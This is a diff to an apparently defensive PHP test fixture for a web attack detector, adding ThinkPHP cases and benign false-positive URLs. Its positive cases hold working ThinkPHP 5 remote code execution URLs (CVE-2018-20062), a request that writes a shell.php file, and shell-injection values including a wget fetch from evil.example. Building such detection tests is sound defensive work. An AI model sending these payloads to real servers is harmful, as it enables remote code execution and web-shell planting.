@@ -125,6 +125,7 @@ return [
             ['/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id', [], 'ATK-PHP'],   // ThinkPHP 5 (CVE-2018-20062)
             ['/index.php?s=index/think%5CContainer/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1', [], 'ATK-PHP'],
             ['/index.php?s=/index/%5Cthink%5Crequest/input&filter=system&data=id', [], 'ATK-PHP'],   // the same way in, without invokefunction
+            ['/index.php?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=shell.php&content=x', [], 'ATK-PHP'],
             ['/?cmd=;cat+/var/log/x', [], 'ATK-SHELL'],
             ['/?cmd=a%7Cwget+http://evil.example/x.sh', [], 'ATK-SHELL'],
             ['/?cmd=$(id)', [], 'ATK-SHELL'],
@@ -275,6 +276,10 @@ return [
             '/?q=bash%20/dev/tcp%20tutorial',        // the device named, no host and port
             '/?q=invokefunction',                    // the word alone: a search
             '/?q=think%20about%20it&ns=App%5CThink',  // "think" as a word, a namespace that ends in it
+            '/?class=App%5CThink%5CFoo',             // a namespace with Think in the middle
+            '/?q=rethink%5Cdb',                      // a word that ends in think
+            '/?data=%7B%22msg%22:%22what%20do%20you%20think%5Cnabout%20it%22%7D',   // JSON text: a line that ends in "think"
+            '/?path=C:%5CUsers%5Cthink%5Cnotes.txt',  // a Windows path
             '/?f=/dev/tcpdump/1',                    // another word
             '/?d=a:1:{i:0;s:1:"x";}',                // a serialised array: no object in it
             '/?t=10:30:00&o=1',                      // times, a parameter called o
